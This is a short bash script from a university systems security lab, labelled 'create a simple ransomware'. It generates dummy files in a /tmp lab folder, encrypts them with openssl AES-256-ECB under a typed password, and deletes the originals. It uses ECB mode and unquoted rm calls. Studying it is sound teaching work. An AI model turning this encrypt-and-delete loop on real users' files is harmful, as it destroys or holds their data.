#!/bin/bash   
# the line above shows which shell to execute the bash script with

# Systems Security Class 2021, Technical University of Crete
# Lab no. 5
# "create a simple ransomware"

FILEDIR=/tmp/lab5_files/

# create the directory, if it does not already exist
mkdir -p $FILEDIR

echo -n "Enter 0 to create, 1 to encrypt, and 2  to decrypt files: "
read choice

if [[ $choice -eq 2 ]]
then
	echo " **decryption mode**"
	echo -e "enter the input filename(or filenames, ls with wildcards): "
	read input
	echo -e "enter password: "
	read pass
	#openssl aes-256-ecb -in $input -out $input.dec  -d -k $pass
	for FILE in $(ls $FILEDIR$input)  
	do
		openssl aes-256-ecb -pbkdf2 -iter 1000 -in $FILE -out $FILE.dec -d -k $pass 
		rm $FILE
	done


elif [[ $choice -eq 1 ]]
then 
	echo " **encryption mode**"
	echo -e "enter the input filename(or filenames, with ls wildcards): "
	read input
	echo -e "enter password: "
	read pass
	#openssl enc -aes-256-ecb -in $input -out $input.enc  -k $pass
	for FILE in $(ls $FILEDIR$input)
        do
                openssl enc -aes-256-ecb -pbkdf2 -iter 1000 -in $FILE -out $FILE.enc -k $pass 
		rm $FILE
        done
elif [[ $choice -eq 0  ]]
then
	echo " Enter how many files you want to create"
	read number_of_files
	echo "Enter a filename"
	read filename
	for number in $(seq 1 $number_of_files)
	do
		# here we print a random string in the files specified
		tr -dc A-Za-z0-9 </dev/urandom | head -c 13 > $FILEDIR$filename$number
		echo "$FILEDIR$filename$number"
	done
else
	echo "Wrong Option"
fi


